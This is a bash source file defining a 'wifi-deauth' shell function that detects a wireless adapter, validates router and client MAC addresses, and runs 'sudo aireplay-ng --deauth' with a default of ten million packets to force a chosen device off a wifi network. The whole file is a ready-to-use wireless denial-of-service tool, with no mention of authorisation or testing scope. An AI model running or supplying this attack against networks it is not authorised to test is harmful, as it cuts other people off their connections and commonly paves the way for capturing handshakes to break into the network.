#!/bin/bash

## Disconnect client from wifi network
function wifi-deauth() {
    function _usage() {
        _echo_success 'usage:' "$1" "$2"; _echo_primary 'wifi-deauth (adapter) -r [router_mac] -c [client_mac] -p [packet_count] -h (help)\n'
    }

    #--------------------------------------------------
    # Variables
    #--------------------------------------------------

    local client
    local packet_count=10000000
    local router
    local wifi_adapter
    local wifi_adapters

    #--------------------------------------------------

    # showing wireless adapters only
    if [ -n "$(command -v 'arp')" ]; then
        # NOTE: arp command prints connected devices only
        # set wireless as default adapter
        wifi_adapter="$(arp -a | cut -d' ' -f7 | grep -E '^w' | head -n1)"
        # list all available adapters
        wifi_adapters="$(printf "%s " "$(arp -a | cut -d' ' -f7 | grep -E '^w')")"

    elif [ -n "$(command -v 'ip')" ]; then
        # set wireless as default adapter
        wifi_adapter="$(ip token | cut -d' ' -f4 | grep -E '^w' | head -n1)"
        # list all available adapters
        wifi_adapters="$(printf "%s " "$(ip token | cut -d' ' -f4 | grep -E '^w')")"

    else
        # set wireless as default adapter
        wifi_adapter="$(ifconfig | grep -E '^w' | head -n1 | cut -d: -f1)"
        # list all available adapters
        wifi_adapters="$(printf "%s " "$(ifconfig | grep -E '^w\w+:' | cut -d: -f1)")"
    fi

    #--------------------------------------------------
    # Parse arguments
    #--------------------------------------------------

    local arguments=()
    local OPTARG
    local option
    while [ "$#" -gt 0 ]; do
        OPTIND=0
        while getopts :c:p:r:h option; do
            case "${option}" in
                c) client="${OPTARG}";;
                p) packet_count="${OPTARG}";;
                r) router="${OPTARG}";;
                h) _echo_warning 'wifi-deauth\n';
                    _echo_success 'description:' 2 14; _echo_primary 'Disconnect client from wifi network\n'
                    _usage 2 14
                    _echo_success 'note:' 2 14; _echo_warning "available adapters: ${wifi_adapters}\n"
                    return 0;;
                :) _echo_danger "error: \"${OPTARG}\" requires value\n"
                    return 1;;
                \?) _echo_danger "error: invalid option \"${OPTARG}\"\n"
                    return 1;;
            esac
        done
        if [ "${OPTIND}" -gt 1 ]; then
            shift $(( OPTIND-1 ))
        fi
        if [ "${OPTIND}" -eq 1 ]; then
            arguments+=("$1")
            shift
        fi
    done

    #--------------------------------------------------
    # Check ifconfig installation
    #--------------------------------------------------

    if [ -z "$(command -v 'ifconfig')" ]; then
        _echo_danger 'error: ifconfig not installed, try "sudo apt-get install -y net-tools"\n'
        return 1
    fi

    #--------------------------------------------------
    # Check aireplay-ng installation
    #--------------------------------------------------

    if [ -z "$(command -v 'aireplay-ng')" ]; then
        _echo_danger 'error: aireplay-ng not installed, try "sudo apt-get install -y aircrack-ng"\n'
        return 1
    fi

    #--------------------------------------------------
    # Validate argument count
    #--------------------------------------------------

    if [ "${#arguments[@]}" -gt 1 ]; then
        _echo_danger "error: too many arguments (${#arguments[@]})\n"
        _usage 2 8
        return 1
    fi

    if [ -z "${client}" ] || [ -z "${router}" ]; then
        _echo_danger 'error: some mandatory parameter is missing\n'
        _usage 2 8
        return 1
    fi

    #--------------------------------------------------

    # check mac adress format valid
    if [[ ! "${router}" =~ ^([a-zA-Z0-9]{2}:){5}[a-zA-Z0-9]{2}$ ]]; then
        _echo_danger "error: wrong mac address format ${router}\n"
        _usage 2 8
        return 1
    fi

    # check mac adress format valid
    if [[ ! "${client}" =~ ^([a-zA-Z0-9]{2}:){5}[a-zA-Z0-9]{2}$ ]]; then
        _echo_danger "error: wrong mac address format ${client}\n"
        _usage 2 8
        return 1
    fi

    if [ -n "${arguments[${LBOUND}]}" ]; then
        wifi_adapter="${arguments[${LBOUND}]}"
    fi

    _echo_info "sudo aireplay-ng --deauth \"${packet_count}\" -a \"${router}\" -c \"${client}\" \"${wifi_adapter}\"\n"
    sudo aireplay-ng --deauth "${packet_count}" -a "${router}" -c "${client}" "${wifi_adapter}"
}
